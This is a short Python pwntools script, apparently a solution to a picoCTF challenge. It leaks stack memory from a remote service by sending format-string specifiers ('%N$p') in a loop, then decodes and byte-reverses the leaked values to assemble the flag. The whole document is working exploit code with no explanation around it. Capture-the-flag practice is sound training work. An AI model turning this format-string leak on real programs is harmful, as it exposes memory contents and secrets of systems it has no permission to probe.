from pwn import *

flag = ''

# fuzzing
for i in range(100):
    try:
        io = remote('mimas.picoctf.net',  54327, level='warn')
        # print ith pointer
        io.sendline('%{}$p'.format(i).encode())
        io.recvuntil(b"Here's your order:")
        res = io.recv()
        if not b'nil' in res:
            print(str(i) + ': ' + str(res.strip(b'\nBye!\n')))
            try:
                # decode + reverse endian
                decoded = unhex(res.strip().strip(b'\nBye!\n').decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                flag += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

info(flag)
